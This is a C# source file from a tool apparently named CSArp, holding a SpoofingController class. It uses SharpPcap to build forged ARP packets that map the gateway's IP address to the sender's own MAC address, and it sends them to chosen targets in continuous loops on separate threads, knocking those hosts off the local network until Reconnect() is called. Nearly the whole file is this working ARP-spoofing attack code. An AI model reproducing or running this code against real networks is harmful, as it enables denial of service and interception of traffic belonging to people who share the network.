using System.Collections.Generic;
using System.Linq;
using System.Net;
using SharpPcap;
using PacketDotNet;
using System.Net.NetworkInformation;
using System.Threading;

namespace CSArp
{
    public static class SpoofingController
    {
        private static Dictionary<IPAddress, PhysicalAddress> engagedclientlist;
        private static bool disengageflag = true;
        private static ICaptureDevice capturedevice;

        public static void Disconnect(IView view, Dictionary<IPAddress, PhysicalAddress> targetlist, IPAddress gatewayipaddress, PhysicalAddress gatewaymacaddress, string interfacefriendlyname)
        {
            engagedclientlist = new Dictionary<IPAddress, PhysicalAddress>();
            IEnumerable<ICaptureDevice> enumerable()
            {
                foreach (var devicex in CaptureDeviceList.Instance)
                {
                    if (((SharpPcap.WinPcap.WinPcapDevice)devicex).Interface.FriendlyName == interfacefriendlyname)
                    {
                        yield return devicex;
                    }
                }
            }

            capturedevice = enumerable().ToList()[0];
            capturedevice.Open();
            foreach (var target in targetlist)
            {
                var myipaddress = ((SharpPcap.WinPcap.WinPcapDevice)capturedevice).Addresses[1].Addr.ipAddress; //possible critical point : Addresses[1] in hardcoding the index for obtaining ipv4 address
                var arppacketforgatewayrequest = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), gatewayipaddress, capturedevice.MacAddress, target.Key);
                var ethernetpacketforgatewayrequest = new EthernetPacket(capturedevice.MacAddress, gatewaymacaddress, EthernetPacketType.Arp);
                ethernetpacketforgatewayrequest.PayloadPacket = arppacketforgatewayrequest;
                ThreadBuffer.Add(new Thread(() =>
                    SendSpoofingPacket(view, target.Key, target.Value, ethernetpacketforgatewayrequest)
                  ));
                engagedclientlist.Add(target.Key, target.Value);
            };
        }

        private static void SendSpoofingPacket(IView view, IPAddress ipAddress, PhysicalAddress physicalAddress, EthernetPacket ethernetpacketforgatewayrequest)
        {

            disengageflag = false;
            DebugOutputClass.Print(view, "Spoofing target " + physicalAddress.ToString() + " @ " + ipAddress.ToString());
            try
            {
                while (!disengageflag)
                {
                    capturedevice.SendPacket(ethernetpacketforgatewayrequest);
                }
            }
            catch (PcapException ex)
            {
                DebugOutputClass.Print(view, "PcapException @ DisconnectReconnect.Disconnect() [" + ex.Message + "]");
            }
            DebugOutputClass.Print(view, "Spoofing thread @ DisconnectReconnect.Disconnect() for " + physicalAddress.ToString() + " @ " + ipAddress.ToString() + " is terminating.");

        }

        public static void Reconnect()
        {
            disengageflag = true;
            if (engagedclientlist != null)
            {
                engagedclientlist.Clear();
            }
        }

    }

}
